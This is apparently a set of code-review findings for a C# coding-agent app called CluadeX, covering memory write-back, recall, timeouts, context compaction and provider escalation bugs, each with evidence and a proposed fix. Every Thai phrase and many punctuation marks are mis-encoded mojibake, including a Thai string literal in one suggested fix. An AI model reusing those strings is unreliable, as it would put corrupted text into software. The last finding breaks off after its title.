findings.title: Automatic write-back to BrainX is effectively unreachable โ€” STRONG tier requires manual UI votes, so the agent never saves decisions to the brain
findings.evidence: Instinct.cs:76-81: `double successRate = votes == 0 ? 0.5 : (double)AcceptCount / votes; ... return Math.Round(successRate * freq * recency, 3);` and Instinct.cs:91: `if (c >= 0.70) return "STRONG";`. The ONLY automatic brain write path is SessionMemoryService.cs:164 `await _brainSync.SyncAllStrongAsync(_instinctService.GetAll(), ct);` which skips everything below STRONG (BrainSyncService.cs:186 `if (i.ConfidenceTier != "STRONG") { skipped++; continue; }`). InstinctService.RecordObservation (line 178) only bumps OccurrenceCount โ€” never AcceptCount.
findings.scenario: User works for weeks with InstinctLearningEnabled=true (default on). Session-end extraction records instincts, but with zero accept-votes successRate is pinned at 0.5, so max confidence = 0.5*1.0*1.0 = 0.5 < 0.70 โ€” no instinct ever reaches STRONG unless the user opens the Instincts page and manually clicks accept ~5+ times per instinct. Result: brain_create_note is NEVER called automatically. The owner's directive 'CluadeX should WRITE BACK decisions' is violated โ€” write-back is manual-only (InstinctsViewModel sync buttons). Additionally there is no session-handoff/decision note written at session end at all: the only brain_create_note/brain_append_note caller in the entire codebase is BrainSyncService.SyncInstinctAsync.
findings.fix: Two-part fix: (1) In SessionMemoryService.ExtractInstinctsAsync, treat extraction itself as weak evidence โ€” e.g. RecordObservation should bump AcceptCount (or add an 'extraction-accept' weight) so repeated observations alone can reach STRONG; or lower the auto-sync gate to EMERGING (>=0.45). (2) Add a real decision write-back: at session end (and/or when an agentic task completes with edits+green build), call brain_create_note with a session-handoff note (branch, files touched, what shipped, gotchas) via BrainSyncService โ€” a new BrainSyncService.WriteSessionHandoffAsync(summary) invoked from SessionMemoryService.ExtractInBackground.

findings.title: Turn-0 auto-recall hardcodes semantic:false โ€” keyword brain_search with a raw 200-char sentence returns 0 hits for natural-language/Thai prompts, and there is no semantic fallback
findings.evidence: CodeAgentService.cs:1064-1065: `string query = userMessage.Length > 200 ? userMessage[..200] : userMessage;` then `string lessons = await _brainSync.SearchAsync(query, limit: 3, semantic: false, timeoutCts.Token);`. BrainSyncService.cs:218 routes this to keyword search: `string tool = semantic ? "brain_semantic_search" : "brain_search";`. The BrainX server's own usage rules say: 'If 0 hits: retry with brain_semantic_search (works for natural-language Thai)'. No retry exists.
findings.scenario: Thai-speaking owner types 'เธกเธฑเธเธเนเธฒเธเธกเธฑเธเธเธฑเธเธซเธฅเธฒเธขเธเธธเธ” เธเนเธงเธขเนเธเนเธซเธเนเธญเธข' โ€” the full sentence is sent verbatim as a keyword query to brain_search. Keyword index has no token overlap with note bodies written in mixed Thai/English, returns 0 hits (or an empty-results JSON), so the recall block is skipped (or worse, an empty block is injected โ€” see separate finding). The known chat-hang root-cause note stored in the brain is never surfaced, and the agent re-debugs a solved problem โ€” exactly what the owner's directive forbids.
findings.fix: In MaybePrependBrainContextAsync: (1) extract 2-4 keywords from the prompt instead of sending the raw sentence (or just trim to first line); (2) call SearchAsync(..., semantic: false) and if the parsed result has 0 hits, retry once with semantic: true inside the same 3s timeout budget (semantic search is the documented fallback for Thai). Alternatively default the auto-recall to semantic: true since BrainX embeds via local Ollama.

findings.title: CORE tool subset for small-ctx local models strips brain_recall while the base system prompt still commands 'call brain_recall BEFORE starting' โ€” local models cannot reach the brain and waste turns on an unknown tool
findings.evidence: CodeAgentService.cs:34-39: `private static readonly HashSet<string> CoreLocalToolNames = new(...) { "read_file", "list_files", "search_content", "search_files", "codebase_search", "find_symbol", "list_symbols", "edit_file", "multi_edit", "write_file", "run_command", "run_build", "run_tests" };` โ€” no brain_recall. CodeAgentService.cs:1571: `var trimmed = toolSchemas.Where(t => CoreLocalToolNames.Contains(t.Name)).ToList();`. Yet the UNCONDITIONAL BuildBaseSystemPrompt section 3b (line 225) says: `- For non-trivial tasks, call brain_recall BEFORE starting, to surface past lessons / decisions / bugs from BrainX`.
findings.scenario: User runs Gemma on llama-server with ContextSize 4096 (the documented priority-#1 local path). The schema set sent to the model excludes brain_recall, but the system prompt explicitly instructs calling it. The weak model obeys the prompt, emits a tool_use for brain_recall, gets a 'tool not found' error from the provider/loop, retries, and burns 1-3 of its capped iterations โ€” contributing to the 'เธกเธฑเธเธเนเธฒเธ/เธเธฑเธ' feel. Even when it doesn't try, the owner's directive 'always used together' is violated for local models: they have NO on-demand path to the brain (turn-0 prepend partially compensates but is keyword-only and 3 hits max).
findings.fix: Add "brain_recall" to CoreLocalToolNames (its schema is ~60 tokens โ€” negligible vs the 4k window), and update the small-ctx NOTE at CodeAgentService.cs:736 to include it. Alternatively, gate the section-3b brain_recall instruction on the same includeToolDefs/localSmallCtx flags so prompt and schemas never contradict.

findings.title: Legacy [ACTION:] tool catalogue never documents brain_recall โ€” OpenAI/Gemini (and local legacy-mode) models are told to call it but never shown its name/args
findings.evidence: GetToolDefinitionsPrompt() (AgentToolService.cs:651-) enumerates read_file/write_file/git/web/memory tools but contains zero occurrences of 'brain' (verified by grep: brain matches in this file are only at lines 69, 82, 103, 386, 598-599, 1121-1122, 2455-2456, 2836-2852 โ€” none inside the legacy prompt builder). The dispatcher DOES accept it (line 2456: `"brain_recall" or "brain_search" or "recall" or "brain" => ToolType.BrainRecall,`) and the base prompt (CodeAgentService.cs:225) instructs using it.
findings.scenario: User selects OpenAI or Gemini provider (SupportsNativeToolUse=false โ’ legacy [ACTION:] loop). The system prompt says 'call brain_recall BEFORE starting' but the AVAILABLE TOOLS catalogue never lists it, so the model either ignores it or guesses the argument block format ([ACTION: brain_recall] with what keys? 'query'? 'q'?). A wrong key silently yields the Fail at line 2843 ('query' is required), costing an iteration. Brain recall is thus unreliable on every non-Anthropic cloud provider.
findings.fix: Add a numbered brain_recall entry to GetToolDefinitionsPrompt() with the exact [ACTION: brain_recall] / query: ... / semantic: true|false / limit: N block format, mirroring the native schema at line 599.

findings.title: MCP initialize response 'instructions' field is discarded โ€” BrainX's HARD RULES (recall-before-answer, save-after-insight, session-handoff) never reach the model
findings.evidence: McpServerManager.cs:166-176: `var initResponse = await transport.SendRequestAsync("initialize", initParams, timeoutMs: 15000, ct: ct); if (!initResponse.IsSuccess) {...}` โ€” initResponse.Result is never parsed for the MCP-spec `instructions` field (grep for 'instructions' across CluadeX/Services/Mcp returns no matches). The BrainX server ships extensive instructions ('BEFORE ANSWERING any non-trivial prompt: run brain_search... AFTER any answer... IMMEDIATELY call brain_create_note').
findings.scenario: The owner configured the BrainX MCP server expecting its embedded usage contract to govern the agent (it does in Claude Code/Desktop, which inject server instructions into the system prompt). In CluadeX the handshake succeeds, tools are registered, but the instructions JSON is dropped on the floor. The model gets brain tools with one-line descriptions and no recall/write-back discipline โ€” directly causing the 'they must call on each other' gap: the model has the write tools (mcp__<server>__brain_create_note via dynamic schemas, line 643) but is never told when/why to use them.
findings.fix: In StartServerAsync, parse `initResponse.Result.Value.GetProperty("instructions")` (when present) into McpServerConfig/registry, expose it via McpServerManager (e.g. GetServerInstructions()), and append it to the system prompt in CodeAgentService.GetSystemPrompt() under a '# Connected MCP server instructions' section (truncate to a budget, and only when includeToolDefs is true).

findings.title: First user message races MCP startup โ€” license validation (15s HTTP timeout) + sequential server handshakes run before the brain connects, and turn-0 recall silently no-ops
findings.evidence: App.xaml.cs:58-77: background task does `await activation.ValidateOnlineAsync();` FIRST (XmanLicenseService.cs:29 `_httpClient.Timeout = TimeSpan.FromSeconds(15);`), THEN `await mcpManager.InitializeAsync();`. McpServerManager.cs:113-119 starts servers sequentially: `foreach (var (name, config) in _configs) { ... await StartServerAsync(name, ct); }` with a 15s handshake timeout each (line 166). Meanwhile CodeAgentService.cs:1052 silently skips recall: `if (... || !_brainSync.IsBrainAvailable) return userMessage;`.
findings.scenario: User launches CluadeX offline or on a slow network: license POST hangs up to 15s, then 2-3 configured MCP servers handshake sequentially (npx-based servers take 3-10s cold). The user types their first task 5 seconds after the window appears โ€” IsBrainAvailable is false, auto-recall is skipped with no indicator, no retry, no deferred recall. The session that most needs the brain's handoff note (the 'continue from yesterday' first message) is exactly the one that never gets it.
findings.fix: (1) Reorder: run McpServerManager.InitializeAsync() before (or concurrently with via Task.WhenAll) license validation. (2) Parallelize StartAllEnabledAsync: `await Task.WhenAll(_configs.Where(c => c.Value.Enabled).Select(c => StartServerAsync(c.Key, ct)));`. (3) In MaybePrependBrainContextAsync, if the brain server is configured+enabled but not yet running, wait briefly (e.g. up to 2s) for startup completion instead of skipping silently, and report 'Brain still connecting โ€” recall skipped' via progress so the gap is visible.

findings.title: Raw brain JSON injected verbatim into the prompt, and the empty-result guard only catches '(' sentinels โ€” '[]' or '{"results":[]}' gets wrapped in a recall block
findings.evidence: CodeAgentService.cs:1068-1069: `if (string.IsNullOrWhiteSpace(lessons) || lessons.StartsWith("(", StringComparison.Ordinal)) return userMessage;` โ€” only filters BrainSyncService's own '(...)' sentinel strings. BrainSyncService.cs:226 returns the brain's raw payload: `return ExtractText(result);` (doc comment line 201: 'The returned text is the brain's raw JSON result'). A zero-hit JSON like `[]` or `{"results":[],"total":0}` passes the guard and is injected inside <brainx_recall> as 'Relevant prior knowledge'.
findings.scenario: Keyword search misses (common per the semantic:false finding). The model receives '<brainx_recall>Relevant prior knowledge from your BrainX knowledge base...: {"results":[]}</brainx_recall>' โ€” a weak 4k-ctx local model wastes ~80 tokens and may even comment on the empty knowledge base instead of doing the task. On hits, full raw JSON (ids, scores, escaped paths) bloats the turn versus a 'title โ€” preview' plaintext rendering, eating the small context the recall was supposed to enrich.
findings.fix: Parse the JSON in BrainSyncService.SearchAsync (it already has ExtractIdAndPath-style best-effort parsing): return a compact plaintext list 'โ€ข {title} [{tags}] โ€” {preview}' and return the '(no results)' sentinel when the hits array is empty. The '(' guard in CodeAgentService then works unchanged.

findings.title: Agent-initiated MCP brain writes flatten arrays/objects to strings โ€” brain_create_note 'tags' arrive as a quoted JSON string (the exact bug fixed for instinct sync, still present on the generic path)
findings.evidence: AgentToolService.cs:2342: `var result = await _mcpManager.CallToolAsync(serverName, toolName, call.Arguments, ct);` where call.Arguments is Dictionary<string,string>. McpServerManager.cs:238-241 warns about exactly this: 'Callers that need to pass arrays or nested objects MUST use the object-overload below to avoid the brain receiving a quoted JSON string instead of a real array.' โ€” but ExecuteMcpToolAsync uses the string-typed overload, which only re-types int/double/bool (lines 245-252).
findings.scenario: Following the owner's directive, the model (Anthropic provider, dynamic MCP schemas from line 643) calls mcp__brainx-brain__brain_create_note with tags=["coding-lesson","cluadex"]. The native tool_use args are stringified into call.Arguments, so the brain receives tags:"[\"coding-lesson\",\"cluadex\"]" โ€” one garbage tag or a schema-validation rejection. Same for any nested-object argument on any MCP server. Write-back attempts that DO happen get silently corrupted, so notes are untagged/orphaned in the knowledge graph.
findings.fix: Preserve the original JSON types: carry a Dictionary<string,JsonElement> (or raw JSON string) on ToolCall for native tool_use calls, and have ExecuteMcpToolAsync call CallToolWithObjectArgsAsync with real typed values. Minimal version: in CallToolAsync, detect values that parse as JSON arrays/objects (trimmed starts with '[' or '{') and pass the parsed JsonElement instead of the string.

findings.title: brain_recall tool call inside the agent loop has no per-call timeout โ€” a hung (alive-but-unresponsive) brain server stalls the turn for the full 30s transport default
findings.evidence: AgentToolService.cs:2850: `string result = await _brainSync.SearchAsync(query, limit, semantic, ct);` passes only the loop ct. BrainSyncService.SearchAsync โ’ McpServerManager.CallToolWithObjectArgsAsync โ’ McpStdioTransport.SendRequestAsync (line 126) `int timeoutMs = 30000` default. By contrast the turn-0 auto-recall path correctly wraps a 3s linked-token timeout (CodeAgentService.cs:1061-1062).
findings.scenario: The BrainX node process is alive but wedged (e.g. Ollama embedding call inside brain_semantic_search blocks). The model calls brain_recall with semantic=true; the agent turn freezes for 30 seconds with the spinner running โ€” to the user this is another 'เธกเธฑเธเธเนเธฒเธ' hang, and on a 15-step agentic task several recalls can add minutes. (When the process is fully dead, IsBrainAvailable/HandleProcessExit fail fast โ€” only the hung-alive case stalls.)
findings.fix: In ExecuteBrainRecallAsync, wrap the call with the same pattern as turn-0: `using var timeoutCts = CancellationTokenSource.CreateLinkedTokenSource(ct); timeoutCts.CancelAfter(TimeSpan.FromSeconds(10));` and return a graceful '(brain timed out)' ToolResult on cancellation, so the loop continues. Optionally plumb a timeoutMs parameter through CallToolWithObjectArgsAsync.

findings.title: Session-end extraction (the only auto write-back trigger) fires only on 'New Chat' โ€” closing the app loses the session's lessons entirely
findings.evidence: Grep across the repo shows exactly one caller: ChatViewModel.cs:1147 `_sessionMemoryService?.ExtractInBackground(CurrentSession.Messages);` inside the new-session command. SessionMemoryService.cs doc (lines 8-10) claims it runs 'after a session ends (user clicks "New Chat" or closes the app)' โ€” the app-close half is not wired (no call from MainWindow.OnClosing / App.OnExit).
findings.scenario: Owner finishes a long debugging session and closes CluadeX (the natural end-of-day action โ€” nobody clicks 'New Chat' before quitting). ExtractInBackground never runs: no memories extracted, no instincts recorded, no STRONG sync to BrainX. Combined with the STRONG-gate finding, the brain write-back path has effectively zero real-world entry points. Note even fixing this needs care: ExtractInBackground is fire-and-forget Task.Run, so on shutdown the work must be awaited (bounded) or the process exits mid-extraction.
findings.fix: Call extraction from the window-closing path: in MainWindow.OnClosing (or App.OnExit), invoke a new awaitable SessionMemoryService.ExtractAndSyncAsync(CurrentSession.Messages) with a ~10s cap (Task.WhenAny + Task.Delay) before MCP servers are disposed โ€” order matters because brain sync needs the MCP transport still alive (App/McpServerManager.Dispose kills it).

findings.title: FindBrainServer matches any running server whose NAME contains 'brain' โ€” no tool-surface verification despite the class contract saying it matches by tool surface
findings.evidence: BrainSyncService.cs:54-61: `foreach (var name in _mcp.GetRunningServers()) { if (name.Contains("obsidianx", ...) || name.Contains("brain", ...)) return name; }` while the class doc (lines 13-15) promises: 'looks for any MCP server whose name contains "obsidianx" or "brain" AND exposes a brain_create_note tool... we match by tool surface, not by display name.'
findings.scenario: User adds an unrelated MCP server named 'brainstorm-ideas' (or names their brain server 'obsidian-notes', containing neither keyword). Case 1: every brain_recall / instinct sync / turn-0 recall is routed to the wrong server, fails with 'tool not found', and โ€” because FindBrainServer returns the FIRST match โ€” the real brain server later in the dictionary is never tried. Case 2: IsBrainAvailable is false forever and the integration silently disables. ConcurrentDictionary enumeration order also makes the pick nondeterministic across runs when both match.
findings.fix: Honor the documented contract: filter GetRunningServers() to those where `_mcp.ToolRegistry.GetToolsForServer(name).Any(t => t.Name == "brain_create_note" || t.Name == "brain_search")` (registry is already populated at handshake, so this is a cheap in-memory check, no extra round-trip), and drop the name heuristic to a tie-breaker.

findings.title: Idle timeout is a hard 120s kill-switch for local native tool calls (non-streaming) โ€” guaranteed TimeoutException on slow local generations, then 3x whole-turn auto-retry = the 'app hangs' symptom
findings.evidence: CodeAgentService.cs:1658-1672: `if (timeoutSec > 0) callCts.CancelAfter(TimeSpan.FromSeconds(timeoutSec)); ... response = await loopProvider.ChatWithToolsAsync(outboundMessages, systemPrompt, toolSchemas, onTextDelta: token => { if (timeoutSec > 0) callCts.CancelAfter(...); // reset idle window` โ€” the reset only happens inside onTextDelta. But LlamaServerProvider.ChatWithToolsAsync (LlamaServerProvider.cs:481-522) sets `["stream"] = false` and NEVER invokes onTextDelta, so the 'idle' window never resets: it is an absolute cap. AppSettings.cs:64 `InteractiveRequestTimeoutSeconds { get; set; } = 120;`. On timeout: `throw new TimeoutException($"Request timed out after {timeoutSec}s...")` (line 1678) โ€” uncaught in the loop, propagates to ChatViewModel.cs:1532-1534 where `ex.Message.Contains("timeout")` marks it retryable and re-runs the ENTIRE SendMessage up to 3 times.
findings.scenario: User runs the priority local path (llama-server, e.g. 14B model, 16k ctx). Prefill of a large system prompt + 46 tool schemas + microcompacted history plus generation easily exceeds 120s on consumer GPUs. The non-streamed /v1/chat/completions call is cancelled at exactly 120s every time, the UI shows a dead spinner for 2 minutes, then ChatViewModel re-sends the whole turn 3 more times (each spinning another 2 minutes), and finally posts an error. From the user's chair: 'เธกเธฑเธเธเนเธฒเธ' โ€” 8+ minutes of hang followed by failure, deterministically, on any model/task slow enough.
findings.fix: Make the llama-server tool path stream (stream:true + parse tool_call deltas, invoking onTextDelta per chunk โ€” ChatAsync already has the SSE parser), OR when the provider call is non-streaming, use a separate, much larger absolute timeout (e.g. LocalToolCallTimeoutSeconds default 600) instead of treating the idle window as a hard cap. At minimum reset the window when response headers arrive.

findings.title: LlamaServerProvider swallows all HTTP errors into TextContent with StopReason=end_turn โ€” the native loop's 413 compaction recovery is dead code on the local path, and context overflow becomes a 'successful' final answer
findings.evidence: LlamaServerProvider.cs:511-518: `if (!response.IsSuccessStatusCode) { var error = ...; return new NativeToolResponse { TextContent = $"llama-server tool call failed ({(int)response.StatusCode}): ...", StopReason = "end_turn" }; }` โ€” no exception is ever thrown. Meanwhile CodeAgentService.cs:1681 `catch (HttpRequestException ex) when (ex.StatusCode == System.Net.HttpStatusCode.RequestEntityTooLarge)` is the ONLY overflow recovery, and CodeAgentService.cs:1780-1808 treats any no-tool-call response as the final answer: `result.FinalResponse = textContent; result.Success = true;`.
findings.scenario: Long agentic session on llama-server; the prompt finally exceeds the context window and the server returns 400 ('the request exceeds the available context size'). Instead of triggering reactive compaction, the error string comes back as TextContent with end_turn, ToolCalls.Count==0, and the loop publishes 'llama-server tool call failed (400): ...' as the assistant's final, Success=true answer. The carefully built microcompact/413-recovery machinery never runs for the provider it was built for (local mode is priority #1). Same for 'llama-server is not running. Load a model first.' (line 476) โ€” mid-loop server death ends the turn as a fake success.
findings.fix: In ChatWithToolsAsync, throw HttpRequestException(message, null, response.StatusCode) on !IsSuccessStatusCode (mirroring AnthropicProvider.cs:474-477), and in the loop catch both 413 and 400-with-context-overflow bodies to trigger the existing reactive compaction. Alternatively set a dedicated StopReason="error" the loop checks before treating text as a final answer.

findings.title: 413 reactive compaction (TakeLast(10) + EnsureAlternatingRoles merge) produces orphaned tool_result blocks and text-before-tool_result ordering โ€” next Anthropic request 400s, killing the turn it tried to save
findings.evidence: CodeAgentService.cs:1688-1699: `nativeMessages = nativeMessages.TakeLast(keepCount).ToList(); nativeMessages.Insert(0, new ... Role = "user", Content = { ... Text = "[Context was compacted...]" }); nativeMessages = EnsureAlternatingRoles(nativeMessages);` โ€” TakeLast can start at a user message whose content is tool_result blocks while the assistant tool_use that owns those IDs was just dropped. EnsureAlternatingRoles (lines 2247-2259) only merges same-role messages (`result[^1].Content.AddRange(msg.Content)`) โ€” it never strips orphaned tool_results, and the merge puts the inserted text block BEFORE the tool_result blocks in one user message.
findings.scenario: Anthropic native loop hits 413 (oversized request). Compaction keeps the last 10 messages; the cut lands between an assistant tool_use message and its user tool_result message (they always travel as a pair, so a 10-message suffix has ~50% odds of splitting one). The recompacted request is rejected by the API ('unexpected tool_use_id found in tool_result' / tool_result ordering error) with HTTP 400 โ€” which the loop does NOT catch (only 413) โ€” so HttpRequestException unwinds the whole turn into ChatViewModel's error bubble, and 400 is not retryable. The recovery converted a recoverable overflow into a hard turn failure.
findings.fix: After TakeLast, walk forward dropping leading messages until the first message is a plain-text user message (or strip tool_result blocks whose ToolUseId has no matching tool_use in the kept window), and insert the compaction notice as content AFTER any tool_result blocks or as its own properly-alternating message.

findings.title: Anthropic reports context overflow as HTTP 400 (invalid_request_error 'prompt is too long'), not 413 โ€” both loops' reactive-compaction recovery keys exclusively on RequestEntityTooLarge and misses the common overflow case
findings.evidence: CodeAgentService.cs:1681 (native) and 1191 (legacy): `catch (HttpRequestException ex) when (ex.StatusCode == System.Net.HttpStatusCode.RequestEntityTooLarge)`. AnthropicProvider.cs:474-477 throws `new HttpRequestException($"Anthropic API error: {error}", null, response.StatusCode)` โ€” Anthropic returns 413 request_too_large only for byte-size limits; token-window overflow ('prompt is too long: X tokens > Y maximum') is a 400 invalid_request_error. A 400 falls through, and ChatViewModel.cs:1532-1534's retryable check (429/500/502/503/timeout) doesn't match either.
findings.scenario: Long Anthropic agentic session accumulates tool results past the model's context window. The API returns 400 'prompt is too long'. Reactive compaction never fires; the user gets a hard error bubble and must manually start a new session โ€” exactly the failure mode the compaction code was written to prevent.
findings.fix: Broaden the catch: `catch (HttpRequestException ex) when (ex.StatusCode == HttpStatusCode.RequestEntityTooLarge || (ex.StatusCode == HttpStatusCode.BadRequest && ex.Message.Contains("prompt is too long", StringComparison.OrdinalIgnoreCase)))` (or have AnthropicProvider classify overflow into a dedicated exception type).

findings.title: repeatErrorCount is never reset on a clean (no-error) turn โ€” escalation fires on non-consecutive repeats, contradicting the 'same error 3 turns running' contract
findings.evidence: CodeAgentService.cs:2010-2016: `bool stagnating = false; if (errSig.Length > 0) { if (errSig == lastErrorSig) repeatErrorCount++; else { repeatErrorCount = 0; lastErrorSig = errSig; } stagnating = repeatErrorCount >= 2; // the same error 3 turns running }` โ€” when a turn has NO failed tools, errSig is empty and the entire block is skipped, leaving lastErrorSig and repeatErrorCount frozen at their last values.
findings.scenario: Turn 3: edit fails with error A (count=0, sig=A). Turn 4: same error A (count=1). Turns 5-9: model recovers and makes 5 turns of clean progress. Turn 10: error A reappears once (count=2 โ’ stagnating=true) โ’ the conversation is escalated to the paid API provider even though the model was demonstrably NOT stuck โ€” it had recovered and only re-hit the error once. With EscalationEnabled, this silently sends the conversation + tool results to an external provider and spends money on a false trigger.
findings.fix: Add an else branch: `if (errSig.Length > 0) { ... } else { repeatErrorCount = 0; lastErrorSig = null; }` so only consecutive failing turns count.

findings.title: ResolveEscalationProvider never checks the target provider is configured/ready โ€” escalating to Anthropic with no API key throws an uncaught 401 HttpRequestException that destroys the whole accumulated turn
findings.evidence: CodeAgentService.cs:2088-2093: `if (!s.EscalationEnabled) return null; if (!Enum.TryParse<AiProviderType>(s.EscalationProviderName, ...)) return null; var p = _providerManager.GetProvider(t); if (p == null || ReferenceEquals(p, current)) return null; if (!p.SupportsNativeToolUse) return null; return p;` โ€” no `p.IsReady` / API-key check (IAiProvider.cs:10 exposes `bool IsReady`; AnthropicProvider sets IsReady=false on blank key). After escalation, the loop's only catches around ChatWithToolsAsync are OperationCanceledException and 413 (lines 1674-1707); AnthropicProvider.cs:474-477 throws HttpRequestException on 401.
findings.scenario: User enables EscalationEnabled but never entered an Anthropic key (or the key expired). The local model stagnates after 10 productive turns; escalation flips loopProvider to Anthropic; the very next request throws 'Anthropic API error: 401' โ€” uncaught โ€” unwinding ExecuteNativeToolLoopAsync. ChatViewModel posts a non-retryable error bubble; all 10 turns of agentic context for this turn's final answer are discarded. A misconfiguration check away from being a graceful skip.
findings.fix: In ResolveEscalationProvider also require `p.IsReady` (and/or a TestConnection-cached flag). Additionally wrap post-escalation provider calls in a try/catch that, on failure, reverts to ending the turn gracefully with the local model's last state instead of letting the exception unwind the loop.

findings.title: Escalated API model inherits the LOCAL-trimmed system prompt (70%-of-4k fit-guard cut + 'you have a CORE tool set of 13 tools' note) while being handed the full 46-tool schema catalogue
findings.evidence: CodeAgentService.cs:1523 builds the prompt once: `string systemPrompt = await GetSystemPromptAsync();` โ€” for a local provider the fit-guard (lines 882-893) hard-truncates it (`built = built[..charBudget] + "\n\n[System prompt trimmed to fit this model's context window..."`), and lines 736-739 inject 'NOTE: Context is limited, so you have a CORE tool set: read_file, list_files, ...'. On escalation (lines 2020-2022) only the schemas are refreshed: `loopProvider = escalationProvider; toolSchemas = _agentToolService.BuildNativeToolSchemas(); // full catalogue` โ€” systemPrompt is never rebuilt. Also `loopIsLocal` (line 1530) stays true, so Claude's text keeps being run through ModelOutputSanitizer.SanitizeStreamChunk (line 1713).
findings.scenario: 4k-ctx local model escalates to Claude. Claude receives a system prompt amputated to ~2,800 tokens (project context, memory, instincts, CLAUDE.md all cut off mid-sentence) that explicitly tells it it only has 13 core tools โ€” while the request's tools array offers 46+. The expensive escalation call runs with contradictory, degraded instructions, exactly when maximum capability was the point. Schema-set + prompt change mid-conversation also invalidates the Anthropic prompt cache (cost).
findings.fix: On escalation, rebuild the system prompt for the target provider (bypass the local fit-guard and small-ctx NOTE โ€” e.g. add a GetSystemPromptAsync(forProvider) overload or invalidate _cachedSystemPrompt with a provider-aware flag), and stop applying the local control-token sanitizer once loopProvider is no longer local.

findings.title: max_tokens recovery can append an assistant message with ZERO content blocks (thinking-only truncation) โ€” Anthropic rejects empty-content messages with 400, killing the turn
findings.evidence: CodeAgentService.cs:1737-1740: `var partialAssistant = new Services.Providers.NativeMessage { Role = "assistant" }; if (!string.IsNullOrEmpty(response.TextContent)) partialAssistant.Content.Add(...); nativeMessages.Add(partialAssistant);` โ€” when TextContent is empty the message is added anyway, with an empty Content list. EnsureAlternatingRoles keeps it (role alternates). The Anthropic API requires every message to have non-empty content.
findings.scenario: ExtendedThinkingEnabled with a generous ThinkingBudgetTokens: the model burns the entire output budget inside the thinking block and stops with stop_reason=max_tokens before emitting any text or tool_use. ThinkingContent is non-empty but TextContent is null โ’ an empty assistant message enters nativeMessages โ’ the continuation request gets HTTP 400 ('all messages must have non-empty content') โ’ uncaught (only 413 is) โ’ the turn dies with an error bubble instead of continuing.
findings.fix: Skip adding partialAssistant when it has no blocks, or add a placeholder text block: `if (partialAssistant.Content.Count == 0) partialAssistant.Content.Add(new ContentBlock { Type = "text", Text = "[output truncated before any visible text]" });`.

findings.title: ToolCallSalvage fires on ANY final answer containing JSON that mentions a real tool name โ€” example/documentation JSON in prose gets EXECUTED and the model's actual explanation is discarded
findings.evidence: CodeAgentService.cs:1759-1775: `if (response.ToolCalls.Count == 0 && _settingsService.Settings.LocalToolCallRepairEnabled) { var salvaged = ToolCallSalvage.ExtractFromText(response.TextContent, ...); if (salvaged.Count > 0) { ... response.StopReason = "tool_use"; response.TextContent = null; // the "text" WAS the tool call` โ€” but ToolCallSalvage.cs:68-76 EnumerateJsonCandidates scans fenced blocks, then EVERY balanced {...} substring, then the whole text; TryReadCall accepts any object with a `name`/`tool`/`action` key resolving to a registered tool. There is no requirement that the JSON dominates the message or that the message lacks surrounding prose.
findings.scenario: User (local model, repair enabled by default): 'explain how your read_file tool works'. The model finishes with prose plus an illustrative snippet: ```json {"name": "read_file", "arguments": {"path": "example.cs"}}```. Salvage 'recovers' it, the explanation is nulled out (TextContent=null), read_file actually executes on example.cs, and the loop keeps going โ€” turning a finished answer into more tool turns. With write-capable examples ({"tool":"run_command",...}) a merely-mentioned command becomes a real execution attempt (gated only by the permission layer).
findings.fix: Only salvage when the message is essentially the tool call: e.g. require the matched JSON region (or fenced block) to cover >80% of the trimmed text, or require the text to start with '{'/'['/a fence and contain no sentence-like prose outside it; also skip salvage for messages that end with '?' or contain code-explanation markers.

findings.title: Mid-loop goal re-injection quotes the WRONG goal whenever BrainX auto-recall fired โ€” the 200-char excerpt is the <brainx_recall> preamble, not the user's request
findings.evidence:
ExecuteAgenticAsync (line 1032) mutates the message BEFORE the loop sees it: `userMessage = await MaybePrependBrainContextAsync(userMessage, progress, ct);` which returns `"<brainx_recall>
Relevant prior knowledge from your BrainX knowledge base..." + lessons + "</brainx_recall>

" + userMessage` (lines 1071-1077). Then the reminder (lines 1995-2001): `string goal = userMessage.Replace("
", " ").Trim(); if (goal.Length > 200) goal = goal[..200] + "โ€ฆ"; ... Text = $"[reminder] The user's request: "{goal}"..."` โ€” the first 200 chars are entirely the recall header/lessons; the actual request is truncated away.
findings.scenario: Local small-ctx model, BrainAutoRecallEnabled, task 'fix the null check in LlamaServerProvider'. At step 4/8/12 the anti-drift reminder injects: '[reminder] The user's request: "<brainx_recall> Relevant prior knowledge from your BrainX knowledge base (past decisions, bug fixes, lessons). Consult it if helpfulโ€ฆ"' โ€” the one mechanism built to stop a weak model from drifting actively feeds it noise instead of the goal. Side effect of the same mutation: LooksNonTrivialTask (line 1536) sees length>200 โ’ plan-first force-tool fires for ANY question once recall hits (and the Thai verb list 'เธ—เธณ' substring-matches 'เธ—เธณเนเธก'/why, so pure why-questions force a tool call too).
findings.fix: Keep the original user message in a separate variable (e.g. `string originalGoal = userMessage;` before the brain prepend in ExecuteAgenticAsync, passed alongside) and use it for both the reminder excerpt and LooksNonTrivialTask; for Thai verbs match with boundaries (exclude 'เธ—เธณเนเธก').

findings.title: Iteration-budget exhaustion is silent: FinalResponse falls back to last step's ResponseText which is "" (never null) for tool-only turns โ€” the 'Agent reached maximum iterations' message is dead code
findings.evidence: CodeAgentService.cs:2052-2056: `if (!result.Success) { result.StopReason = "max_iterations"; result.FinalResponse = result.Steps.LastOrDefault()?.ResponseText ?? "Agent reached maximum iterations."; }` โ€” but line 1726 sets `step.ResponseText = response.TextContent ?? "";` so ResponseText is never null once any step ran; on a tool-heavy run the last step's text is typically "" and the `??` never fires. ChatViewModel's blank-bubble safety net (lines 1755-1762) posts a generic placeholder, but nothing tells the user the step budget ran out. (Same dead `??` in the legacy loop at line 1327.)
findings.scenario: A 30-step refactor hits MaxAgentIterations=25 mid-edit (or earlier when auto-verify fail/fix cycles consume turns). The loop stops between an edit and its verification; the user sees an empty/generic assistant message with no 'ran out of steps โ€” say continue' hint, and may believe the task finished. Files are left half-modified with no explanation.
findings.fix: Use `string.IsNullOrWhiteSpace` instead of `??` and append an explicit, localized exhaustion notice: `result.FinalResponse = (lastText + "\n\n") + (isThai ? "โ  เธเธฃเธ {N} เธเธฑเนเธเธ—เธตเนเธเธณเธซเธเธ” โ€” เธเธดเธกเธเน 'เธ—เธณเธ•เนเธญ' เน€เธเธทเนเธญเนเธซเนเธ—เธณเธเธฒเธเธ•เนเธญ" : "โ  Reached the {N}-step limit before finishing โ€” say 'continue' to resume.");`

findings.title: Step counter lies after escalation extends the budget โ€” status shows 'Step 27/25' because the label uses MaxAgentIterations while the loop runs to iterationBudget
